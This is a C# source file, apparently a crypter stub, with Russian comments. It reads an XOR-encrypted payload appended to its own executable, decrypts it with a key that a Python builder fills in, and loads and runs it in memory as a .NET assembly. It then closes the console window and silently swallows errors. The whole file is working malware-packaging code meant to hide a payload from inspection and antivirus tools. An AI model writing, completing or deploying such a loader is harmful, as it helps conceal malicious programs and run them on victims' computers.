using System;
using System.IO;
using System.Reflection;

namespace DotNetStubClean
{
    class Program
    {
        // XOR дешифровка
        static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            return result;
        }

        static void Main()
        {
            // === СЮДА ПОДСТАВЛЯЕТСЯ ПИТОНОМ ===
            byte[] ENCRYPTION_KEY = /*KEY_PLACEHOLDER*/;
            int PAYLOAD_SIZE = 0; // подставляется

            try
            {
                // Записываем отладочную информацию
                // File.WriteAllText("dotnet_stub_debug.txt", $"Starting .NET loader, payload size: {PAYLOAD_SIZE}");
                
                // Получаем путь к текущему exe
                string exePath = Assembly.GetExecutingAssembly().Location;
                // File.AppendAllText("dotnet_stub_debug.txt", $"\nExe path: {exePath}");
                
                // Проверяем размер файла
                FileInfo fileInfo = new FileInfo(exePath);
                // File.AppendAllText("dotnet_stub_debug.txt", $"\nFile size: {fileInfo.Length}");
                
                if (fileInfo.Length < PAYLOAD_SIZE)
                {
                    // File.AppendAllText("dotnet_stub_debug.txt", $"\nERROR: File too small! Expected at least {PAYLOAD_SIZE} bytes, got {fileInfo.Length}");
                    return;
                }
                
                // Читаем payload из конца файла
                byte[] encryptedPayload = new byte[PAYLOAD_SIZE];
                using (FileStream fs = new FileStream(exePath, FileMode.Open, FileAccess.Read))
                {
                    fs.Seek(-PAYLOAD_SIZE, SeekOrigin.End);
                    int bytesRead = fs.Read(encryptedPayload, 0, PAYLOAD_SIZE);
                    // File.AppendAllText("dotnet_stub_debug.txt", $"\nBytes read: {bytesRead}");
                }

                // Дешифруем payload
                byte[] decrypted = XorDecrypt(encryptedPayload, ENCRYPTION_KEY);
                // File.AppendAllText("dotnet_stub_debug.txt", $"\nPayload decrypted, size: {decrypted.Length}");

                // Загружаем и запускаем как .NET Assembly
                Assembly asm = Assembly.Load(decrypted);
                MethodInfo entry = asm.EntryPoint;
                if (entry != null)
                {
                    // File.AppendAllText("dotnet_stub_debug.txt", $"\nEntry point found: {entry.Name}");
                    object[] parameters = entry.GetParameters().Length == 0 ? null : new object[] { new string[0] };
                    entry.Invoke(null, parameters);
                    // Закрыть консольное окно после запуска payload
                    System.Diagnostics.Process.GetCurrentProcess().CloseMainWindow();
                }
                else
                {
                    // File.AppendAllText("dotnet_stub_debug.txt", $"\nERROR: No entry point found");
                }
            }
            catch (Exception ex)
            {
                // File.WriteAllText("dotnet_stub_error.txt", ex.ToString());
                // File.AppendAllText("dotnet_stub_debug.txt", $"\nEXCEPTION: {ex.Message}");
            }
        }
    }
} 